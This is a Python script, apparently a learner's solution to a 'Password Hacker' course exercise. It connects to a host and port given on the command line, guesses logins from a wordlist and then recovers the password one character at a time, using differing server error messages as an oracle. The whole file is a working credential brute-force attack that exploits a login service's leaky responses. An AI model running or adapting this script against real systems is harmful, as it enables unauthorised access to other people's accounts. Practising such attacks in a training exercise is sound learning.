from argparse import ArgumentParser
from json import dumps, loads
from socket import socket
from string import ascii_letters, digits

LOGINS = (r'C:\Users\filip\OneDrive\PycharmProjects\Password Hacker (Python)'
          r'\logins.txt')

ALPHABET = ascii_letters + digits

WRONG_LOGIN = {'result': 'Wrong login!'}
WRONG_PASSWORD = {'result': 'Wrong password!'}
BAD_REQUEST = {'result': 'Bad request!'}
EXCEPTION = {'result': 'Exception happened during login'}
SUCCESS = {'result': 'Connection success!'}


class Credentials(dict):
    def __init__(self, login: str | None, password: str | None):
        super().__init__(login=login, password=password)

    def update_login(self, new_login: str):
        self['login'] = new_login

    def update_password(self, new_password: str):
        self['password'] = new_password

    def to_json(self, indent=None):
        return dumps(self, indent=indent)


def get_address() -> tuple[str, int]:
    parser = ArgumentParser()
    parser.add_argument('host')
    parser.add_argument('port', type=int)
    args = parser.parse_args()

    return args.host, args.port


def get_logins():
    with open(LOGINS) as f:
        logins = (line.strip() for line in f)
        yield from logins


def brute_force_login(client):
    credentials = Credentials(None, ' ')

    for login in get_logins():
        credentials.update_login(login)

        client.send(credentials.to_json().encode())
        response = client.recv(1024).decode()
        response = loads(response)

        if response == WRONG_PASSWORD:
            return credentials


def brute_force_password(client, credentials):
    password = []
    found = False
    while not found:
        for character in ALPHABET:
            credentials.update_password(''.join(password) + character)

            client.send(credentials.to_json().encode())
            response = client.recv(1024).decode()
            response = loads(response)

            if response == EXCEPTION:
                password.append(character)
                break
            elif response == SUCCESS:
                return credentials


def main():
    address = get_address()

    with socket() as client:
        client.connect(address)

        creds = brute_force_login(client)
        creds = brute_force_password(client, creds)

    print(creds.to_json())


if __name__ == "__main__":
    main()
